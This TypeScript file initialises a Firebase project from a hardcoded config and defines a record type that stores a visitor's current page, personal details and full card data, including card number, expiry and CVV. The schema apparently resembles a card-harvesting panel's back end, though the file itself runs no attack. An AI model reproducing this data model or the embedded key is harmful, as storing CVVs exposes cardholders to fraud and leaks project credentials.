import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyBdEabfH-ffmrWH4uq3YVwJtlcAnWARiEo",
  authDomain: "xczxczxczxc-9fe7d.firebaseapp.com",
  databaseURL: "https://xczxczxczxc-9fe7d-default-rtdb.firebaseio.com",
  projectId: "xczxczxczxc-9fe7d",
  storageBucket: "xczxczxczxc-9fe7d.firebasestorage.app",
  messagingSenderId: "300165970707",
  appId: "1:300165970707:web:91e75bb4fee8c82bb9f8e6",
  measurementId: "G-YBMR5X7T4D"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
